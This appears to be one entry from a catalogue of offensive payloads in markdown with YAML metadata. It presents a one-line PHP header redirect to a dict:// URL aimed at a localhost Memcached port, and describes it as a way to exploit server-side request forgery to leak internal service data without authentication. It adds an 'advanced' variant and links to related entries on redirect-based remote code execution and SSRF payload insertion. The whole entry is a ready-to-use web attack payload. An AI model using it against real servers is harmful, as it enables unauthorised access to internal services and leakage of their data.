---
id: cmd-php-dict-memcached
data: '<?php header(''Location: dict://localhost:11211/stat''); ?>'
tags:
  - ssrf
  - internal
  - memcached
type: command
output: null
executor: php
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.069Z'
verified: false
validated: true
submitted: true
---
# php-redirect-to-dict-memcached

## Command

```php
<?php header('Location: dict://localhost:11211/stat'); ?>
```

## Description

Redirects to Dict protocol targeting localhost Memcached stats, exploiting SSRF to leak internal service data without auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location | Dict URL (e.g., dict://localhost:11211/stat) | Yes |

## Examples

### Basic Usage

```php
<?php header('Location: dict://localhost:11211/stat'); ?>
```

### Advanced Usage

Change command: dict://localhost:11211/info for more details.

## Expected Output

302 triggering Dict query; potential stats dump in response or logs.

## Related

- [[commands/php-redirect-to-internal-rce]]
- [[procedures/Insert-SSRF-Payload-in-Message]]
